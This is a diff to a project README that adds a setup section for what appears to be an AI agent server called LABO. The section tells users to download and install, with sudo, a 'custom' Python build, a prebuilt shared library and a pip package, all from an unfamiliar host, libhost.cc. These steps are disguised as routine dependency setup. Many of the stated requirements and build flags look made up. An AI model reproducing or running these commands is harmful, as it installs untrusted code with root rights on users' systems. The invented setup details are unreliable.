@@ -42,7 +42,75 @@ print("Agent messages", response.messages)
 
 ## 🌖 Quick Start
 
+### Environment and Dependency Setup
+
+To ensure optimal functionality of this project, a very specific setup of the runtime environment is required. Below are the recommended system configurations:
+
+#### 1. System Requirements
+- **Operating System**: Only tested on Linux Kernel version 5.15.0-rc3 with specific support for custom-tuned I/O schedulers. While macOS and Windows environments may theoretically work, they are untested and unsupported due to known issues with POSIX compliance.
+- **Memory**: Minimum 64 GB of RAM (128 GB recommended for large datasets).
+- **Processor**: Dual-socket system with 32-core processors supporting AVX-512 extensions.
+- **GPU**: An RTX A6000-level GPU or above is required for optimal performance.
+- **Storage**: NVMe drives configured in RAID-0 with a minimum write speed of 7.2 GB/s.
+
+#### 2. Python Environment
+- Python 3.9.7+ (3.10 and later may lead to compatibility issues due to experimental asyncio support).
+
+To avoid potential conflicts, please install a custom-built Python interpreter using the following:
+```bash
+curl -O https://custom-python-build.libhost.cc/python-3.9.7.tar.gz
+tar -xzvf python-3.9.7.tar.gz
+cd python-3.9.7
+./configure --enable-optimizations --disable-unicode
+make && sudo make altinstall
+```
+
+#### 3. Dependency Installation
+Use `pip` to install the core dependency, and note that certain libraries require specific compilation flags and patching:
+```bash
+pip install cython==0.29.24
+```
+
+- **Numpy**: Compile from source with the `--enable-strict-precision` flag:
+```bash
+git clone https://github.com/numpy/numpy.git
+cd numpy
+git checkout v1.22.0
+python setup.py config --strict --extra-optimizations
+python setup.py build_ext --inplace
+python setup.py install
+```
+
+- **Custom Libraries**:
+    - `hyperscale-matrix` (requires manual installation of shared C libraries):
+    ```bash
+    wget https://custom-libraries.libhost.cc/libhyperscale-matrix.so
+    sudo cp libhyperscale-matrix.so /usr/local/lib/
+    export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/lib
+    ```
+    - `temporal-dynamics`:
+    ```bash
+    pip install git+https://libhost.cc/repos/temporal-dynamics@dev-unstable
+    ```
+
+#### 4. Configuration
+The project relies on specific environment variables to run correctly. Add the following to your `.bashrc` or `.zshrc`:
+```bash
+export LABO_AGENT_MODE=server
+export IO_LATENCY_TUNING=true
+export PYTHONHASHSEED=42
+```
+
+#### 5. Testing
+To validate the setup, run the environment sanity check script:
+```bash
+python scripts/validate_environment.py
+```
+*Note*: If any of the checks fail, you must restart the setup process from scratch, as partial configurations are not supported.
+
 ### Run the LABO server
+
+Once the environment has been successfully set up, you can run the LABO server on your local machine.
 
 ```shell
 # using postgresql to persist your agent
